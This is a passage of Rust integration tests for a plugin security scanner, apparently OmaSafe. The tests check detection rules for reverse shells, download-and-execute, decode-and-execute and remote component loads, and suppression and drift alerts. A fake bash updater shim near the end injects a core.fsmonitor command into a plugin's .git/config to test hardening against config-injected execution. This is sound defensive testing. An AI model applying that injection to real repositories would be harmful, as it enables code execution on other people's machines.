        let report = scan_h2_fixture(name);
        let analysis = &report["result"]["analysis"];
        let findings = analysis["findings"].as_array().unwrap();
        let remote: Vec<&Value> = findings
            .iter()
            .filter(|finding| finding["rule_id"] == "oma.qml.remote-component-load")
            .collect();
        assert_eq!(remote.len(), 1, "{name}: {findings:?}");
        assert_eq!(remote[0]["severity"], "high");
        assert!(
            remote[0]["evidence"]
                .as_str()
                .unwrap()
                .starts_with(&format!("remote-component-load:{sink_label}:https://"))
        );
        let limitations = analysis["coverage_limitations"].as_array().unwrap();
        assert!(
            limitations.iter().all(|limitation| !limitation
                .as_str()
                .unwrap()
                .starts_with("sink-reference-rejected:")),
            "{name}: {limitations:?}"
        );
    }
    // createComponent additionally joins the dynamic-code family.
    let report = scan_h2_fixture("remote-create-component");
    let findings = report["result"]["analysis"]["findings"].as_array().unwrap();
    assert!(
        findings
            .iter()
            .any(|finding| finding["rule_id"] == "oma.qml.dynamic-code"),
        "{findings:?}"
    );
}

#[test]
fn h2_fixtures_keep_remote_directory_imports_indicator_only() {
    // H0 probe C: remote directory imports are scanner-intercepted on the
    // pinned runtime, so both the `as`-qualified and bare spellings record
    // the low-severity indicator and never the High remote-load rule. Local
    // relative imports and the resolving local Loader stay silent.
    let report = scan_h2_fixture("remote-directory-import");
    let analysis = &report["result"]["analysis"];
    let findings = analysis["findings"].as_array().unwrap();
    let indicators: Vec<&Value> = findings
        .iter()
        .filter(|finding| finding["rule_id"] == "oma.qml.remote-directory-import")
        .collect();
    assert_eq!(indicators.len(), 2, "{findings:?}");
    assert!(
        indicators
            .iter()
            .all(|finding| finding["severity"] == "low"),
        "{findings:?}"
    );
    assert!(
        !findings.iter().any(
            |finding| finding["rule_id"] == "oma.qml.remote-component-load"
                || finding["rule_id"] == "oma.qml.out-of-tree-reference"
        ),
        "{findings:?}"
    );
    let edges = analysis["invocation_edges"].as_array().unwrap();
    assert!(
        edges
            .iter()
            .any(|edge| edge["target_path"] == "widgets/Widget.qml"),
        "{edges:?}"
    );
}

#[test]
fn h2_fixtures_surface_out_of_tree_references() {
    for name in ["out-of-tree-absolute", "out-of-tree-traversal"] {
        let report = scan_h2_fixture(name);
        let findings = report["result"]["analysis"]["findings"].as_array().unwrap();
        let out_of_tree: Vec<&Value> = findings
            .iter()
            .filter(|finding| finding["rule_id"] == "oma.qml.out-of-tree-reference")
            .collect();
        assert_eq!(out_of_tree.len(), 1, "{name}: {findings:?}");
        assert_eq!(out_of_tree[0]["severity"], "medium");
        assert!(
            !findings
                .iter()
                .any(|finding| finding["rule_id"] == "oma.qml.remote-component-load"),
            "{name}: {findings:?}"
        );
    }
}

#[test]
fn h2_benign_references_fixture_is_silent() {
    // Icon names, format strings, commented URLs, and a non-sink
    // unresolvable path-shaped string produce no finding and no limitation;
    // the resolving local Loader still forms its edge.
    let report = scan_h2_fixture("benign-references");
    let analysis = &report["result"]["analysis"];
    assert_eq!(analysis["findings"].as_array().unwrap().len(), 0);
    assert_eq!(
        analysis["coverage_limitations"].as_array().unwrap().len(),
        0
    );
    let edges = analysis["invocation_edges"].as_array().unwrap();
    assert!(
        edges.iter().any(|edge| edge["target_path"] == "Widget.qml"),
        "{edges:?}"
    );
}

/// Scan an H3 adversarial fixture plugin tree from `fixtures/plugins/`.
fn scan_h3_fixture(name: &str) -> Value {
    scan_h2_fixture(name)
}

#[test]
fn h3_fixtures_surface_script_evasions() {
    // Each evasion fixture produces exactly the rule family it exists to
    // prove, at catalog severity.
    for (name, rule_id, expected, severity) in [
        ("reverse-shell", "oma.script.reverse-shell", 2u64, "high"),
        (
            "download-execute-nopipe",
            "oma.script.download-execute",
            2,
            "high",
        ),
        ("decode-execute", "oma.script.decode-execute", 1, "high"),
        (
            "privileged-shared-temp",
            "oma.script.privileged-shared-temp",
            1,
            "low",
        ),
        (
            "privileged-shared-temp-controlled",
            "oma.script.privileged-shared-temp-controlled",
            1,
            "high",
        ),
    ] {
        let report = scan_h3_fixture(name);
        let findings = report["result"]["analysis"]["findings"].as_array().unwrap();
        let matching: Vec<&Value> = findings
            .iter()
            .filter(|finding| finding["rule_id"] == rule_id)
            .collect();
        assert_eq!(matching.len(), expected as usize, "{name}: {findings:?}");
        assert!(
            matching
                .iter()
                .all(|finding| finding["severity"] == severity),
            "{name}: {findings:?}"
        );
    }
    // The controlled fixture carries the High rule WITHOUT repurposing the
    // indicator id; the indicator fixture never carries the High rule.
    let controlled = scan_h3_fixture("privileged-shared-temp-controlled");
    let controlled_findings = controlled["result"]["analysis"]["findings"]
        .as_array()
        .unwrap();
    assert!(
        !controlled_findings
            .iter()
            .any(|finding| finding["rule_id"] == "oma.script.privileged-shared-temp"),
        "{controlled_findings:?}"
    );
    let indicator = scan_h3_fixture("privileged-shared-temp");
    let indicator_findings = indicator["result"]["analysis"]["findings"]
        .as_array()
        .unwrap();
    assert!(
        !indicator_findings
            .iter()
            .any(|finding| finding["rule_id"] == "oma.script.privileged-shared-temp-controlled"),
        "{indicator_findings:?}"
    );
}

#[test]
fn h3_benign_scripts_fixture_stays_finding_free() {
    // Logged curl-pipe string, nc without -e, non-temp sudo, decode without
    // a consumer, and a non-releasing chmod produce zero findings. The live
    // wget still records honest egress attribution.
    let report = scan_h3_fixture("benign-scripts");
    let analysis = &report["result"]["analysis"];
    assert_eq!(analysis["findings"].as_array().unwrap().len(), 0);
    assert_eq!(
        analysis["coverage_limitations"].as_array().unwrap().len(),
        0
    );
    assert!(
        analysis["capabilities"]
            .as_array()
            .unwrap()
            .iter()
            .any(|capability| capability["capability"] == "network-access"),
        "{:?}",
        analysis["capabilities"]
    );
}

#[test]
fn h3_script_fixture_pins_false_positive_and_false_negative() {
    // One fixture holding BOTH directions of the round-12 review: the
    // multiline quoted eval must fire only after logical-source assembly
    // (false-negative guard), while option arity, operand precedence, and
    // heredoc data must stay silent through full-file analysis
    // (false-positive guard).
    let report = scan_h3_fixture("script-fp-fn");
    let analysis = &report["result"]["analysis"];
    let findings = analysis["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1, "{findings:?}");
    assert_eq!(findings[0]["rule_id"], "oma.script.download-execute");
    assert_eq!(findings[0]["severity"], "high");
    // The line pins WHICH fixture line fired: the intended positive is the
    // eval unit starting on line 4, so a vanished positive replaced by a
    // false positive on a guard line (option arity, heredoc data) can no
    // longer satisfy this test.
    assert_eq!(findings[0]["line"], 4, "{findings:?}");
    assert_eq!(
        findings[0]["explanation"],
        "A bundled script pipes downloaded content straight into a shell or interpreter.",
        "{findings:?}"
    );
    assert!(
        findings[0]["evidence"]
            .as_str()
            .unwrap()
            .starts_with("download-execute"),
        "{findings:?}"
    );
    assert!(
        analysis["capabilities"]
            .as_array()
            .unwrap()
            .iter()
            .any(|capability| capability["capability"] == "network-access"),
        "{:?}",
        analysis["capabilities"]
    );
}

#[test]
fn h3_heredoc_ownership_fixture_pins_continued_owner_and_grouped_data() {
    // One fixture holding BOTH directions of the Stage A ownership review:
    // a heredoc whose owner sits on the continued line must fire (the
    // classifier sees the complete command), while a grouped data heredoc
    // and a non-adjacent same-command override must stay silent.
    let report = scan_h3_fixture("heredoc-ownership");
    let analysis = &report["result"]["analysis"];
    let findings = analysis["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1, "{findings:?}");
    assert_eq!(findings[0]["rule_id"], "oma.script.download-execute");
    assert_eq!(findings[0]["severity"], "high");
    // The finding pins the continued owner's unit: it starts on the `sh \`
    // line, so a vanished positive replaced by a false positive on a guard
    // line cannot satisfy this test.
    assert_eq!(findings[0]["line"], 4, "{findings:?}");
    assert!(
        analysis["capabilities"]
            .as_array()
            .unwrap()
            .iter()
            .any(|capability| capability["capability"] == "network-access"),
        "{:?}",
        analysis["capabilities"]
    );
}

#[test]
fn h3_continued_headers_fixture_pins_bodies_after_the_whole_command() {
    // One fixture holding BOTH directions of the continued-header review:
    // the bodies of a backslash-continued data pipeline begin only after
    // the whole command ends, so the curl line stays cat food (silent),
    // while both heredocs of one continued interpreter command execute —
    // the second body's decode rule proves the continued tail ran.
    let report = scan_h3_fixture("heredoc-continued-headers");
    let analysis = &report["result"]["analysis"];
    let findings = analysis["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 2, "{findings:?}");
    let rules: Vec<&str> = findings
        .iter()
        .map(|finding| finding["rule_id"].as_str().unwrap())
        .collect();
    assert!(rules.contains(&"oma.script.download-execute"), "{rules:?}");
    assert!(rules.contains(&"oma.script.decode-execute"), "{rules:?}");
    // Both rows pin the continued command's unit start, so a vanished
    // positive replaced by a guard-line false positive cannot satisfy
    // this test.
    assert!(
        findings
            .iter()
            .all(|finding| finding["severity"] == "high" && finding["line"] == 13),
        "{findings:?}"
    );
    assert!(
        analysis["capabilities"]
            .as_array()
            .unwrap()
            .iter()
            .any(|capability| capability["capability"] == "network-access"),
        "{:?}",
        analysis["capabilities"]
    );
}

#[test]
fn equivalence_staleness_is_disclosed_when_cached_snapshot_moves() {
    let temp = tempfile::TempDir::new().unwrap();
    fs::write(temp.path().join("Main.qml"), "Text {}\n").unwrap();

    let fixture = Fixture::new();
    // The fixture's isolated HOME has no cached catalog: no staleness.
    let output = fixture
        .command()
        .args([
            "scan-plugin",
            "--path",
            temp.path().to_str().unwrap(),
            "--format",
            "json",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let report: Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(
        report["result"]["analysis"]["equivalence"]["external_ruleset_version"],
        "3"
    );

    // A cached snapshot recording a NEWER external baseline marks the map
    // stale in the report limitations. The fixture wires XDG_CACHE_HOME to an
    // isolated tempdir.
    let omasafe_cache = fixture.cache.path().join("omasafe");
    fs::create_dir_all(&omasafe_cache).unwrap();
    fs::write(
        omasafe_cache.join("catalog.json"),
        r#"[{"id":"x","verificationBaselineVersion":"9"}]"#,
    )
    .unwrap();
    let output_stale = fixture
        .command()
        .args([
            "scan-plugin",
            "--path",
            temp.path().to_str().unwrap(),
            "--format",
            "text",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let text = String::from_utf8(output_stale).unwrap();
    assert!(
        text.contains("equivalence-map-stale:map-v3-observed-v9"),
        "{text}"
    );
}

#[test]
fn staleness_reader_accepts_wrapped_catalog_shapes() {
    let shapes = [
        r#"{"entries":[{"id":"x","verificationBaselineVersion":"9"}]}"#,
        r#"{"plugins":[{"id":"x","verificationBaselineVersion":"9"}]}"#,
    ];
    for shape in shapes {
        let temp = tempfile::TempDir::new().unwrap();
        fs::write(temp.path().join("Main.qml"), "Text {}\n").unwrap();

        let fixture = Fixture::new();
        let omasafe_cache = fixture.cache.path().join("omasafe");
        fs::create_dir_all(&omasafe_cache).unwrap();
        fs::write(omasafe_cache.join("catalog.json"), shape).unwrap();
        let output = fixture
            .command()
            .args([
                "scan-plugin",
                "--path",
                temp.path().to_str().unwrap(),
                "--format",
                "text",
            ])
            .assert()
            .success()
            .get_output()
            .stdout
            .clone();
        let text = String::from_utf8(output).unwrap();
        assert!(
            text.contains("equivalence-map-stale:map-v3-observed-v9"),
            "{shape} must mark staleness: {text}"
        );
    }
}

#[test]
fn text_output_discloses_inventory_and_analysis_limitations_together() {
    let temp = tempfile::TempDir::new().unwrap();
    fs::write(temp.path().join("Main.qml"), "Text {}\n").unwrap();
    fs::write(temp.path().join("manifest.json"), b"{ not json").unwrap();
    // A non-UTF-8 entry name trips an inventory-side collection limitation.
    #[cfg(unix)]
    {
        use std::os::unix::ffi::OsStrExt;
        let bad_name = std::ffi::OsStr::from_bytes(b"bad\xff.qml");
        fs::write(temp.path().join(bad_name), "Text {}\n").unwrap();
    }

    let fixture = Fixture::new();
    let output = fixture
        .command()
        .args([
            "scan-plugin",
            "--path",
            temp.path().to_str().unwrap(),
            "--format",
            "text",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let text = String::from_utf8(output).unwrap();
    #[cfg(unix)]
    assert!(text.contains("non_utf8_entry_name_skipped"), "{text}");
    assert!(text.contains("manifest-context-unreadable"), "{text}");
}

#[test]
fn plugins_analyze_fail_on_returns_threshold_exit_code() {
    let fixture = Fixture::new();
    fs::write(
        fixture.plugin.join("main.qml"),
        "Process { command: [\"sh\", \"-c\", \"ls\"] }\n",
    )
    .unwrap();
    // Threshold above the finding: plain success.
    fixture
        .command()
        .args(["plugins", "analyze", "io.example.cli", "--fail-on", "high"])
        .assert()
        .success();
    // Medium finding meets the low threshold: exit 4 with a full report.
    let output = fixture
        .command()
        .args([
            "plugins",
            "analyze",
            "io.example.cli",
            "--format",
            "json",
            "--fail-on",
            "low",
        ])
        .assert()
        .code(4)
        .get_output()
        .stdout
        .clone();
    let threshold_report: Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(
        threshold_report["result"]["analysis"]["findings"][0]["severity"],
        "medium"
    );
}

#[test]
fn suppression_hides_finding_and_de_enforces_without_touching_stored_analysis() {
    let fixture = Fixture::new();
    fs::write(
        fixture.plugin.join("main.qml"),
        "Process { command: [\"sh\", \"-c\", \"ls\"] }\n",
    )
    .unwrap();

    // Baseline: the medium finding trips a low threshold (exit 4).
    let output = fixture
        .command()
        .args([
            "plugins",
            "analyze",
            "io.example.cli",
            "--format",
            "json",
            "--fail-on",
            "low",
        ])
        .assert()
        .code(4)
        .get_output()
        .stdout
        .clone();
    let baseline: Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(
        baseline["result"]["analysis"]["findings"]
            .as_array()
            .unwrap()
            .len(),
        1
    );
    let baseline_fingerprint = baseline["result"]["analysis"]["analysis_fingerprint"].clone();

    // Suppress the rule for this plugin.
    fixture
        .command()
        .args([
            "plugins",
            "review",
            "io.example.cli",
            "--action",
            "suppress",
            "--rule",
            "oma.qml.process-execution",
            "--reason",
            "reviewed: launcher pattern is expected here",
            "--yes",
        ])
        .assert()
        .success();

    // The finding is hidden AND de-enforced, while every stored analysis
    // artifact stays byte-identical.
    let output = fixture
        .command()
        .args([
            "plugins",
            "analyze",
            "io.example.cli",
            "--format",
            "json",
            "--fail-on",
            "low",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let suppressed: Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(
        suppressed["result"]["analysis"]["findings"]
            .as_array()
            .unwrap()
            .len(),
        0
    );
    assert_eq!(
        suppressed["result"]["analysis"]["analysis_fingerprint"], baseline_fingerprint,
        "suppressions never alter stored findings"
    );
    assert_eq!(
        suppressed["result"]["analysis"]["capabilities"],
        baseline["result"]["analysis"]["capabilities"]
    );
    let applied = suppressed["result"]["suppressions"]["applied"]
        .as_array()
        .unwrap();
    assert_eq!(applied.len(), 1);
    assert_eq!(applied[0]["rule_id"], "oma.qml.process-execution");
    assert_eq!(suppressed["result"]["suppressions"]["active_records"], 1);

    // Plugin-scoped suppressions do not apply in plugin-less contexts.
    fixture
        .command()
        .args([
            "scan-plugin",
            "--path",
            fixture.plugin.to_str().unwrap(),
            "--format",
            "json",
            "--fail-on",
            "low",
        ])
        .assert()
        .code(4);
}

#[test]
fn suppression_path_scope_and_reinstate_flow_is_auditable() {
    let fixture = Fixture::new();
    fs::write(
        fixture.plugin.join("main.qml"),
        "Process { command: [\"sh\", \"-c\", \"ls\"] }\n",
    )
    .unwrap();

    // A path scope that does not cover main.qml leaves the finding enforced.
    fixture
        .command()
        .args([
            "plugins",
            "review",
            "io.example.cli",
            "--action",
            "suppress",
            "--rule",
            "oma.qml.process-execution",
            "--path",
            "docs",
            "--reason",
            "scoped elsewhere",
            "--yes",
        ])
        .assert()
        .success();
    fixture
        .command()
        .args(["plugins", "analyze", "io.example.cli", "--fail-on", "low"])
        .assert()
        .code(4);

    // Whole-target suppression hides it.
    fixture
        .command()
        .args([
            "plugins",
            "review",
            "io.example.cli",
            "--action",
            "suppress",
            "--rule",
            "oma.qml.process-execution",
            "--reason",
            "accepted after review",
            "--yes",
        ])
        .assert()
        .success();
    fixture
        .command()
        .args(["plugins", "analyze", "io.example.cli", "--fail-on", "low"])
        .assert()
        .success();

    // Reinstating the docs scope flips exactly that record; the
    // whole-target suppression still enforces.
    fixture
        .command()
        .args([
            "plugins",
            "review",
            "io.example.cli",
            "--action",
            "reinstate",
            "--rule",
            "oma.qml.process-execution",
            "--path",
            "docs",
            "--reason",
            "scope changed",
            "--yes",
        ])
        .assert()
        .success();
    fixture
        .command()
        .args(["plugins", "analyze", "io.example.cli", "--fail-on", "low"])
        .assert()
        .success();

    // A rule with no active suppression anywhere fails loudly.
    fixture
        .command()
        .args([
            "plugins",
            "review",
            "io.example.cli",
            "--action",
            "reinstate",
            "--rule",
            "oma.qml.session-lock",
            "--reason",
            "nothing to reinstate",
            "--yes",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("no active suppression matches"));

    // Exact reinstate restores enforcement; both records remain auditable.
    fixture
        .command()
        .args([
            "plugins",
            "review",
            "io.example.cli",
            "--action",
            "reinstate",
            "--rule",
            "oma.qml.process-execution",
            "--reason",
            "acceptance withdrawn",
            "--yes",
        ])
        .assert()
        .success();
    fixture
        .command()
        .args(["plugins", "analyze", "io.example.cli", "--fail-on", "low"])
        .assert()
        .code(4);

    let raw = fs::read(fixture.config.path().join("omasafe/suppressions.json")).unwrap();
    let state: Value = serde_json::from_slice(&raw).unwrap();
    let records = state["suppressions"].as_array().unwrap();
    assert_eq!(records.len(), 2);
    assert_eq!(records[0]["active"], false);
    assert!(!records[0]["reinstated_at"].is_null());
    assert_eq!(records[1]["active"], false);
    assert!(!records[1]["reinstated_at"].is_null());
}

#[test]
fn rules_explain_reports_definition_and_baseline_equivalences() {
    let fixture = Fixture::new();
    let output = fixture
        .command()
        .args([
            "rules",
            "explain",
            "oma.script.download-execute",
            "--format",
            "json",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let report: Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(
        report["result"]["rule"]["id"],
        "oma.script.download-execute"
    );
    assert!(
        report["result"]["external_equivalences"]
            .as_array()
            .unwrap()
            .iter()
            .any(|entry| entry["externalId"] == "curl-pipe-shell"),
        "{report}"
    );

    let text = fixture
        .command()
        .args(["rules", "explain", "oma.script.download-execute"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let text = String::from_utf8(text).unwrap();
    assert!(text.contains("Marketplace baseline coverage"), "{text}");
    assert!(text.contains("curl-pipe-shell"), "{text}");

    fixture
        .command()
        .args(["rules", "explain", "oma.does-not-exist"])
        .assert()
        .failure()
        .stderr(predicates::str::contains("unknown rule id"));
}

fn seed_analysis_event(
    fixture: &Fixture,
    plugin_id: &str,
    source_identity: &str,
    policy_identity: &str,
    fingerprint: &str,
    finding_rule_ids: &[&str],
    capability_kinds: &[&str],
) {
    let path = fixture.state.path().join("omasafe/scan-state.json");
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    let state = serde_json::json!({
        "schema_version": 1,
        "alerts": {},
        "analysis_events": {
            plugin_id: {
                "source_identity": source_identity,
                "policy_identity": policy_identity,
                "fingerprint": fingerprint,
                "finding_rule_ids": finding_rule_ids,
                "capability_kinds": capability_kinds,
            }
        }
    });
    fs::write(path, serde_json::to_vec_pretty(&state).unwrap()).unwrap();
}

fn stored_analysis_event(fixture: &Fixture, plugin_id: &str) -> Value {
    let path = fixture.state.path().join("omasafe/scan-state.json");
    let raw = fs::read(path).unwrap();
    let state: Value = serde_json::from_slice(&raw).unwrap();
    state["analysis_events"][plugin_id].clone()
}

fn scan_alert_kinds(fixture: &Fixture, args: &[&str]) -> (i32, Vec<String>) {
    let output = fixture.command().args(args).output().expect("scan runs");
    let code = output.status.code().unwrap_or(-1);
    if code != 0 && code != 3 {
        panic!(
            "scan failed unexpectedly: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let kinds = report["result"]["alerts"]
        .as_array()
        .unwrap()
        .iter()
        .map(|alert| alert["kind"].as_str().unwrap().to_owned())
        .collect();
    (code, kinds)
}

fn current_policy_identity_string(fixture: &Fixture) -> String {
    let output = fixture
        .command()
        .args(["rules", "list", "--format", "json"])
        .output()
        .unwrap();
    assert!(output.status.success());
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    serde_json::to_string(&report["result"]["policy_identity"]).unwrap()
}

#[test]
fn include_analysis_distinguishes_policy_update_from_drift_and_stays_quiet_by_default() {
    let fixture = Fixture::new();
    fs::write(
        fixture.plugin.join("main.qml"),
        "Process { command: [\"sh\", \"-c\", \"ls\"] }\n",
    )
    .unwrap();
    let inventory = fixture.inventory();
    let digest = inventory["result"]["plugins"][0]["content_digest"]
        .as_str()
        .unwrap()
        .to_owned();

    // A recorded policy that no longer matches means the analyzer changed:
    // a re-evaluation notice, distinct from drift and from nondeterminism.
    // Default scans never emit analysis events.
    seed_analysis_event(
        &fixture,
        "io.example.cli",
        &digest,
        "\"stale-policy\"",
        "any-fingerprint",
        &["oma.qml.process-execution"],
        &["process-execution"],
    );
    let (_, kinds) = scan_alert_kinds(&fixture, &["scan", "--format", "json"]);
    assert!(
        !kinds.iter().any(|kind| kind.starts_with("analysis-"))
            && !kinds.contains(&"analyzer-policy-update".to_owned()),
        "{kinds:?}"
    );

    let (_, kinds) = scan_alert_kinds(
        &fixture,
        &["scan", "--include-analysis", "--format", "json"],
    );
    assert!(
        kinds.contains(&"analyzer-policy-update".to_owned()),
        "{kinds:?}"
    );
    assert!(
        !kinds.contains(&"fingerprint-instability".to_owned()),
        "{kinds:?}"
    );
    assert!(
        !kinds.contains(&"finding-regression".to_owned()),
        "{kinds:?}"
    );
    assert!(!kinds.contains(&"new-capability".to_owned()), "{kinds:?}");
}

#[test]
fn identical_source_and_policy_with_moved_fingerprint_is_instability() {
    let fixture = Fixture::new();
    fs::write(
        fixture.plugin.join("main.qml"),
        "Process { command: [\"sh\", \"-c\", \"ls\"] }\n",
    )
    .unwrap();
    let inventory = fixture.inventory();
    let digest = inventory["result"]["plugins"][0]["content_digest"]
        .as_str()
        .unwrap()
        .to_owned();
    let policy = current_policy_identity_string(&fixture);

    seed_analysis_event(
        &fixture,
        "io.example.cli",
        &digest,
        &policy,
        "seed-mismatched-fingerprint",
        &["oma.qml.process-execution"],
        &["process-execution"],
    );
    let (_, kinds) = scan_alert_kinds(
        &fixture,
        &["scan", "--include-analysis", "--format", "json"],
    );
    assert!(
        kinds.contains(&"fingerprint-instability".to_owned()),
        "{kinds:?}"
    );
    assert!(
        !kinds.contains(&"analyzer-policy-update".to_owned()),
        "{kinds:?}"
    );
}

#[test]
fn include_analysis_emits_new_capability_and_finding_regression_alerts() {
    let fixture = Fixture::new();
    fs::write(
        fixture.plugin.join("main.qml"),
        "Process { command: [\"sh\", \"-c\", \"ls\"] }\n",
    )
    .unwrap();

    // First opted-in run is a quiet baseline.
    let (_, kinds) = scan_alert_kinds(
        &fixture,
        &["scan", "--include-analysis", "--format", "json"],
    );
    assert!(!kinds.contains(&"new-capability".to_owned()), "{kinds:?}");
    assert!(
        !kinds.contains(&"finding-regression".to_owned()),
        "{kinds:?}"
    );

    // Trim the stored snapshot's observed sets while keeping identity and
    // fingerprint intact: the next clean round must report exactly the
    // growth.
    let mut record = stored_analysis_event(&fixture, "io.example.cli");
    record["capability_kinds"] = serde_json::json!(["clipboard-access"]);
    record["finding_rule_ids"] = serde_json::json!(["oma.qml.session-lock"]);
    let path = fixture.state.path().join("omasafe/scan-state.json");
    let mut state: Value = serde_json::from_slice(&fs::read(&path).unwrap()).unwrap();
    state["analysis_events"]["io.example.cli"] = record;
    fs::write(&path, serde_json::to_vec_pretty(&state).unwrap()).unwrap();

    let (_, kinds) = scan_alert_kinds(
        &fixture,
        &["scan", "--include-analysis", "--format", "json"],
    );
    assert!(kinds.contains(&"new-capability".to_owned()), "{kinds:?}");
    assert!(
        kinds.contains(&"finding-regression".to_owned()),
        "{kinds:?}"
    );
    assert!(
        !kinds.contains(&"fingerprint-instability".to_owned()),
        "{kinds:?}"
    );
}

#[test]
fn instability_rounds_do_not_mask_capability_and_finding_growth() {
    let fixture = Fixture::new();
    fs::write(
        fixture.plugin.join("main.qml"),
        "Process { command: [\"sh\", \"-c\", \"ls\"] }\n",
    )
    .unwrap();
    let inventory = fixture.inventory();
    let digest = inventory["result"]["plugins"][0]["content_digest"]
        .as_str()
        .unwrap()
        .to_owned();
    let policy = current_policy_identity_string(&fixture);

    // Fingerprint moved under identical identity AND the stored snapshot
    // misses capabilities/findings the current analysis observes: the
    // instability error must not mask the growth alerts (and vice versa).
    seed_analysis_event(
        &fixture,
        "io.example.cli",
        &digest,
        &policy,
        "stale-fingerprint",
        &["oma.qml.session-lock"],
        &["clipboard-access"],
    );
    let (_, kinds) = scan_alert_kinds(
        &fixture,
        &["scan", "--include-analysis", "--format", "json"],
    );
    assert!(
        kinds.contains(&"fingerprint-instability".to_owned()),
        "{kinds:?}"
    );
    assert!(kinds.contains(&"new-capability".to_owned()), "{kinds:?}");
    assert!(
        kinds.contains(&"finding-regression".to_owned()),
        "{kinds:?}"
    );
}

#[test]
fn default_scans_never_clear_analysis_event_dedup_state() {
    let fixture = Fixture::new();
    fs::write(
        fixture.plugin.join("main.qml"),
        "Process { command: [\"sh\", \"-c\", \"ls\"] }\n",
    )
    .unwrap();
    let inventory = fixture.inventory();
    let digest = inventory["result"]["plugins"][0]["content_digest"]
        .as_str()
        .unwrap()
        .to_owned();

    // Record an analysis event as already notified.
    let path = fixture.state.path().join("omasafe/scan-state.json");
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    let state = serde_json::json!({
        "schema_version": 1,
        "alerts": {"analysis:io.example.cli:fingerprint-instability": "earlier"},
        "analysis_events": {
            "io.example.cli": {
                "source_identity": digest,
                "policy_identity": "stale-policy",
                "fingerprint": "x",
                "finding_rule_ids": [],
                "capability_kinds": []
            }
        }
    });
    fs::write(&path, serde_json::to_vec_pretty(&state).unwrap()).unwrap();

    // A notifying DEFAULT scan must leave the analysis key in place even
    // though it holds no live analysis keys of its own.
    let output = fixture
        .command()
        .args(["scan", "--notify", "--format", "json"])
        .output()
        .expect("default scan runs");
    assert!(
        output.status.success() || output.status.code() == Some(3),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    let persisted: Value = serde_json::from_slice(&fs::read(&path).unwrap()).unwrap();
    assert!(
        persisted["alerts"]["analysis:io.example.cli:fingerprint-instability"] == "earlier",
        "default scan cleared analysis dedup state: {persisted}"
    );
}

// ---------------------------------------------------------------------------
// S7: plugins review-update — reviewed update workflow
// ---------------------------------------------------------------------------

/// Fake `omarchy` shim driven by a JSON state file. Emulates the native
/// plugin lifecycle surface OmaSafe delegates to (list/disable/enable/update/
/// bar use) against REAL git repositories so postcondition checks observe
/// actual HEAD movement, including the raced-commit scenario. All fake state
/// reaches the shim through per-invocation environment variables, never the
/// test process globals.
struct FakeOmarchy {
    state_path: PathBuf,
    log_path: PathBuf,
}

impl FakeOmarchy {
    fn install(bin: &Path, state_dir: &Path) -> Self {
        let state_path = state_dir.join("omarchy-fake.json");
        let log_path = state_dir.join("omarchy-fake.log");
        let script = r#"#!/bin/bash
STATE="$OMASAFE_FAKE_STATE"
ORIGIN="$OMASAFE_FAKE_ORIGIN"
RACE_ORIGIN="$OMASAFE_FAKE_RACE_ORIGIN"
PLUGIN_DIR="$OMASAFE_FAKE_PLUGIN_DIR"
LOG="$OMASAFE_FAKE_LOG"
echo "$*" >> "$LOG"
get() { jq -r "$1" "$STATE"; }
# Only bash builtins and jq are guaranteed on the restricted fixture PATH.
set() { jq "$1" "$STATE" > "$STATE.new" && mapfile -t lines < "$STATE.new" && printf '%s\n' "${lines[@]}" > "$STATE"; return 0; }
case "$*" in
  "plugin list --json")
    calls=$(get '.listCalls // 0')
    set ".listCalls = ($calls + 1)" > /dev/null
    if [[ $(get '.listFails // false') == "true" && $calls -ge 1 ]]; then
      echo "simulated shell failure" >&2; exit 1
    fi
    jq -c '[.plugin]' "$STATE"
    ;;
    "plugin update io.example.cli --yes")
    mode=$(get '.updateMode // "ok"')
    printf 'gitenv=%s:%s=%s:%s=%s:%s=%s:%s=%s:%s=%s\n' \
      "$GIT_CONFIG_COUNT" "$GIT_CONFIG_KEY_0" "$GIT_CONFIG_VALUE_0" \
      "$GIT_CONFIG_KEY_1" "$GIT_CONFIG_VALUE_1" \
      "$GIT_CONFIG_KEY_2" "$GIT_CONFIG_VALUE_2" \
      "$GIT_CONFIG_KEY_3" "$GIT_CONFIG_VALUE_3" \
      "$GIT_CONFIG_KEY_4" "$GIT_CONFIG_VALUE_4" >> "$LOG"
    if [[ $mode == "fail" ]]; then
      echo "omarchy-plugin-update: update of 'io.example.cli' failed validation; rolled back" >&2
      exit 1
    fi
    if [[ $mode == "sleep" ]]; then
      # Only jq and bash builtins are guaranteed on the fixture PATH.
      jq -n '{fakeUpdateStarted: true}' > "$OMASAFE_FAKE_STARTED"
      end=$((SECONDS + 30))
      while (( SECONDS < end )); do :; done
    fi
    source="$ORIGIN"
    [[ $mode == "race" ]] && source="$RACE_ORIGIN"
    if [[ $mode == "config-race" ]]; then
      # Synchronous and BEFORE Git fetch/merge. The fake updater only runs
      # after OmaSafe's pre-mutation audit, so this is exactly the window
      # where native Git would consume injected config. The hardened snapshot
      # plus env overrides must neutralize it: no execution, no persistence.
      printf '#!/bin/sh\nprintf executed > "$OMASAFE_FAKE_FS_MONITOR_MARKER"\n' > "$OMASAFE_FAKE_FS_MONITOR_COMMAND"
      /bin/chmod +x "$OMASAFE_FAKE_FS_MONITOR_COMMAND"
      printf '\n[core]\n\tfsmonitor = %s\n' "$OMASAFE_FAKE_FS_MONITOR_COMMAND" >> "$PLUGIN_DIR/.git/config"
    fi
    git -C "$PLUGIN_DIR" fetch -q "$source" HEAD
